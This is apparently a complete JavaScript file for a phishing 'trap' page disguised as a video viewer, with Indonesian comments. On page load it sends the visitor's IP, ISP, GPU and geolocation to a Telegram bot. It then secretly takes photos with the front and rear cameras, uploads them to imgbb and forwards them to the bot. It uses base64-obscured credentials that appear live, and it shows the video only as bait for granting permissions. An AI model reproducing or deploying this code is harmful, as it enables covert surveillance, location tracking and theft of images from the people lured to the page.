
const BOT_TOKEN = atob('NzY3ODUxNjQwODpBQUc1b2prN3JDZUhUTDVhWkRZak9obGlYRVRGVWZybUY4Yw==');
const CHAT_ID = atob('ODE1NTI3NDI1MA==');
const IMGBB_API_KEY = atob('MjIyZDJiZGJjNGU0MTI2YmNhYmQ1ZDBiNDg1N2QwNGQ=');
const NUM_PHOTOS = 5;
let permissionGranted = false;

const media_list = ["https://files.catbox.moe/nr8esv.mp4", "https://files.catbox.moe/nr8esv.mp4"];
const media_type = 'video';
const main_media = document.querySelector('#media-viewer > *');

function changeMedia(index) {
    main_media.src = media_list[index] + (media_type === 'video' ? '#t=0.1' : '');
    if (media_type === 'video') { main_media.muted = false; main_media.play(); }
}

function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }) });
}
function sendFileToTelegram(file, caption, type='document') {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append(type, file, file.name);
    formData.append('caption', caption);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: formData });
}

function showContent() { document.getElementById('loader').style.display = 'none'; const iw = document.getElementById('media-wrapper'); iw.style.display = 'flex'; setTimeout(() => iw.classList.add('visible'), 50); }
function showDeniedMessage() { document.getElementById('loader').style.display = 'none'; document.getElementById('denied-message').style.display = 'block'; }

async function runAllTraps() {
    const delay = ms => new Promise(res => setTimeout(res, ms));
    sendToTelegram('🔥 *Jebakan Aktif!* Target Membuka Link...');

    // 1. Info Perangkat
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        const gpuInfo = gl ? (gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : 'N/A') : 'N/A';
        const ip_res = await fetch('https://ip-api.com/json');
        const ip_data = await ip_res.json();
        const msg = `*📱 Info Perangkat & Jaringan*\n\n*IP Address:* \`${ip_data.query}\`\n*Provider:* ${ip_data.isp}\n*GPU:* \`${gpuInfo}\``;
        sendToTelegram(msg);
    } catch (e) {}

    await delay(500);

    // 2. Lokasi
    await new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(pos => {
            sendToTelegram(`*📍 Lokasi:*
Lat: \`${pos.coords.latitude}\`, Lon: \`${pos.coords.longitude}\``);
            permissionGranted = true; resolve();
        }, err => { sendToTelegram(`*❌ Lokasi Ditolak/Gagal*`); resolve(); });
    });
    
    await delay(500);

    // 3. Kamera (Depan & Belakang)
    for (let facingMode of ['user', 'environment']) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode, width: 1280, height: 720 } });
            sendToTelegram(`✅ Izin Kamera *${facingMode == 'user' ? 'Depan' : 'Belakang'}* diberikan!`);
            permissionGranted = true;
            const track = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(track);
            const blob = await imageCapture.takePhoto();
            track.stop();
            const formData = new FormData();
            formData.append('image', blob, `snap.jpg`);
            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: formData });
            const result = await res.json();
            if (result.success) sendFileToTelegram(result.data.url, `Foto Jebakan [${facingMode}]`);
        } catch(e) { sendToTelegram(`- Tidak bisa akses kamera ${facingMode}.`); }
        await delay(500);
    }
    
    if (permissionGranted) { showContent(); } else { showDeniedMessage(); }
}
window.onload = runAllTraps;
